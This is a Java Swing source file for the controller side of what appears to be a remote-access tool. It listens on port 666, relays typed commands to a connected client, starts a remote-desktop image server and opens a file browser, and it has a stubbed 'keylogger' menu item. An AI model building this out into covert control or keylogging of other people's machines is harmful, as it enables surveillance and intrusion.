/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package servidor;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.text.DefaultCaret;

/**
 *
 * @author Debci
 */
public class DebciServidor extends javax.swing.JFrame {
    public static OutputStream flujoSalidaPrimario = null;
    public static DataOutputStream flujoSalida = null;
    private static String comandoRecibido;
    static Socket servidor;
    static ServerSocket socketServidor;
    /**
     * Creates new form DebciServidor
     */
    public DebciServidor() {
        initComponents();
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jButton1 = new javax.swing.JButton();
        jScrollPane1 = new javax.swing.JScrollPane();
        jTextPane1 = new javax.swing.JTextPane();
        jMenu3 = new javax.swing.JMenu();
        jMenuItem1 = new javax.swing.JMenuItem();
        jMenuItem2 = new javax.swing.JMenuItem();
        button_Comando = new javax.swing.JButton();
        txt_ConsoleInput = new javax.swing.JLabel();
        jScrollPane3 = new javax.swing.JScrollPane();
        textArea_Salida = new javax.swing.JTextArea();
        textBox_Comando = new javax.swing.JTextPane();
        entradaComando = new javax.swing.JTextField();
        jButton2 = new javax.swing.JButton();
        barraMenu = new javax.swing.JMenuBar();
        menu_Herramientas = new javax.swing.JMenu();
        menuItem_TransformadorKeylogger = new javax.swing.JMenuItem();
        menud_Ayuda = new javax.swing.JMenu();

        jButton1.setText("jButton1");

        jScrollPane1.setViewportView(jTextPane1);

        jMenu3.setText("jMenu3");

        jMenuItem1.setText("jMenuItem1");

        jMenuItem2.setText("jMenuItem2");

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        button_Comando.setText("Enviar");
        button_Comando.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                button_ComandoActionPerformed(evt);
            }
        });

        txt_ConsoleInput.setText("Console input:");

        textArea_Salida.setEditable(false);
        textArea_Salida.setColumns(20);
        textArea_Salida.setRows(5);
        textArea_Salida.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        textArea_Salida.setDisabledTextColor(new java.awt.Color(0, 0, 0));
        textArea_Salida.setEnabled(false);
        jScrollPane3.setViewportView(textArea_Salida);

        textBox_Comando.setAutoscrolls(false);
        textBox_Comando.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyPressed(java.awt.event.KeyEvent evt) {
                textBox_ComandoKeyPressed(evt);
            }
        });

        entradaComando.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyPressed(java.awt.event.KeyEvent evt) {
                entradaComandoKeyPressed(evt);
            }
        });

        jButton2.setText("Archivos");
        jButton2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton2ActionPerformed(evt);
            }
        });

        menu_Herramientas.setText("Herramientas");

        menuItem_TransformadorKeylogger.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_T, java.awt.event.InputEvent.CTRL_MASK));
        menuItem_TransformadorKeylogger.setText("Transformador keylogger");
        menuItem_TransformadorKeylogger.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                menuItem_TransformadorKeyloggerActionPerformed(evt);
            }
        });
        menu_Herramientas.add(menuItem_TransformadorKeylogger);

        barraMenu.add(menu_Herramientas);

        menud_Ayuda.setText("Ayuda");
        barraMenu.add(menud_Ayuda);

        setJMenuBar(barraMenu);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(jScrollPane3, javax.swing.GroupLayout.DEFAULT_SIZE, 500, Short.MAX_VALUE)
                            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                                .addGap(0, 0, Short.MAX_VALUE)
                                .addComponent(button_Comando))
                            .addGroup(layout.createSequentialGroup()
                                .addComponent(entradaComando, javax.swing.GroupLayout.PREFERRED_SIZE, 108, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addGap(0, 0, Short.MAX_VALUE)))
                        .addContainerGap())
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(txt_ConsoleInput)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(jButton2)
                        .addGap(75, 75, 75))))
            .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                .addGroup(layout.createSequentialGroup()
                    .addGap(0, 196, Short.MAX_VALUE)
                    .addComponent(textBox_Comando, javax.swing.GroupLayout.PREFERRED_SIZE, 128, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addGap(0, 196, Short.MAX_VALUE)))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(txt_ConsoleInput)
                    .addComponent(jButton2))
                .addGap(3, 3, 3)
                .addComponent(entradaComando, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(18, 18, 18)
                .addComponent(jScrollPane3, javax.swing.GroupLayout.DEFAULT_SIZE, 186, Short.MAX_VALUE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(button_Comando)
                .addContainerGap())
            .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                .addGroup(layout.createSequentialGroup()
                    .addGap(0, 143, Short.MAX_VALUE)
                    .addComponent(textBox_Comando, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addGap(0, 143, Short.MAX_VALUE)))
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void button_ComandoActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_button_ComandoActionPerformed
        enviarComando();
    }//GEN-LAST:event_button_ComandoActionPerformed

    private void textBox_ComandoKeyPressed(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_textBox_ComandoKeyPressed
        if(evt.getKeyCode() == 10){
            enviarComando();
        }
    }//GEN-LAST:event_textBox_ComandoKeyPressed

    private void menuItem_TransformadorKeyloggerActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_menuItem_TransformadorKeyloggerActionPerformed
        System.out.println("Menú abierto...");
    }//GEN-LAST:event_menuItem_TransformadorKeyloggerActionPerformed

    private void entradaComandoKeyPressed(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_entradaComandoKeyPressed
        if(evt.getKeyCode() == 10){
            enviarComando();
        }
        textArea_Salida.setCaretPosition(textArea_Salida.getDocument().getLength());
    }//GEN-LAST:event_entradaComandoKeyPressed

    private void jButton2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton2ActionPerformed
        fileBrowser buscadorArchivos = new fileBrowser();
        buscadorArchivos.setVisible(true);
    }//GEN-LAST:event_jButton2ActionPerformed

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) throws IOException {
            /* Set the Nimbus look and feel */
            //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
            /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
             * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
             */
            try {
                for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                    if ("Nimbus".equals(info.getName())) {
                        javax.swing.UIManager.setLookAndFeel(info.getClassName());
                        break;
                    }
                }
            } catch (ClassNotFoundException ex) {
                java.util.logging.Logger.getLogger(DebciServidor.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
            } catch (InstantiationException ex) {
                java.util.logging.Logger.getLogger(DebciServidor.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
            } catch (IllegalAccessException ex) {
                java.util.logging.Logger.getLogger(DebciServidor.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
            } catch (javax.swing.UnsupportedLookAndFeelException ex) {
                java.util.logging.Logger.getLogger(DebciServidor.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
            }
            //</editor-fold>

            /* Create and display the form */
            java.awt.EventQueue.invokeLater(new Runnable() {
                public void run() {
                   
                        new DebciServidor().setVisible(true);
                        
                }
            });  
            File miDir = new File (".");
            System.out.println(miDir.getCanonicalPath()+miDir.getAbsolutePath());
            ProcesoServidor();
    }
    static void ProcesoServidor() throws IOException{
        boolean condicionLectura = true;
        while(true){
            try {
                socketServidor = new ServerSocket(666);
                System.out.println("[!]Esperando conexiones...");
                servidor = socketServidor.accept();
                //Declaracion flujo de salida
                textArea_Salida.append("[+]Conexión establecida.\n");
                flujoSalidaPrimario = servidor.getOutputStream();
                flujoSalida = new DataOutputStream(flujoSalidaPrimario);
                //Declaracion flujo de entrada
                InputStream flujoEntradaPrimario = servidor.getInputStream();
                DataInputStream flujoEntrada = new DataInputStream(flujoEntradaPrimario);
                while(condicionLectura){  
                    comandoRecibido = new String(flujoEntrada.readUTF());
                    textArea_Salida.append(comandoRecibido+"\n");
                    procesadorComandos(comandoRecibido);
                }
            } catch (SocketException ex) {
                textArea_Salida.append("[-]Conexion perdida.\n");
                condicionLectura = false;
                socketServidor.close();
                servidor.close();
                ProcesoServidor();
            }finally{
              
            }
        }
    }
    void enviarComando(){
        try {
            textArea_Salida.append("->"+entradaComando.getText()+"\n");
            if(entradaComando.getText().equals("exit")){
                System.exit(666);
            }else{
                flujoSalida.writeUTF(entradaComando.getText());
            }
        } catch (IOException ex) {
            Logger.getLogger(DebciServidor.class.getName()).log(Level.SEVERE, null, ex);
        } catch (NullPointerException ex){
            textArea_Salida.append("[!]No hay ningún cliente conectado.\n");
        }finally{
            entradaComando.setText(null);
        }
    }
    static void procesadorComandos(String comando){
        switch(comando){
            case "initRemoteDesktopTramit":
                ServidorImagenes servidorEscritorio = new ServidorImagenes();
                servidorEscritorio.iniServ();
            break;
        }
    }
    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JMenuBar barraMenu;
    private javax.swing.JButton button_Comando;
    private javax.swing.JTextField entradaComando;
    private javax.swing.JButton jButton1;
    private javax.swing.JButton jButton2;
    private javax.swing.JMenu jMenu3;
    private javax.swing.JMenuItem jMenuItem1;
    private javax.swing.JMenuItem jMenuItem2;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane3;
    private javax.swing.JTextPane jTextPane1;
    private javax.swing.JMenuItem menuItem_TransformadorKeylogger;
    private javax.swing.JMenu menu_Herramientas;
    private javax.swing.JMenu menud_Ayuda;
    private static javax.swing.JTextArea textArea_Salida;
    private javax.swing.JTextPane textBox_Comando;
    private javax.swing.JLabel txt_ConsoleInput;
    // End of variables declaration//GEN-END:variables
}